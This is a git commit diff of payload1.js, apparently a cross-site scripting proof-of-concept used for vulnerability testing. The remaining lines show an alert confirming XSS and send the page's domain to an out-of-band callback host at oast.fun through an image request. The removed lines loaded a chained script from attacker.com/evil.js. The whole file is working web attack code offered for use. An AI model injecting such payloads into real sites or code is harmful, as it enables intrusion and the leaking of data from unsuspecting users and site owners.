93ad842ff65be3b77289c23341ecdae8d669fd7c
siddhu-1005 <84862560+siddhu-1005@users.noreply.github.com>
2025-07-25 22:29:15 +0530

    payload1.js

--- payload1.js
+++ payload1.js
@@ -1,8 +1,2 @@
 alert("✅ XSS Confirmed: " + document.domain);
 new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/?x=" + document.domain;
-
-
-// You can optionally load another script dynamically too:
-var s = document.createElement('script');
-s.src = "https://attacker.com/evil.js"; // optional chained payload
-document.body.appendChild(s);
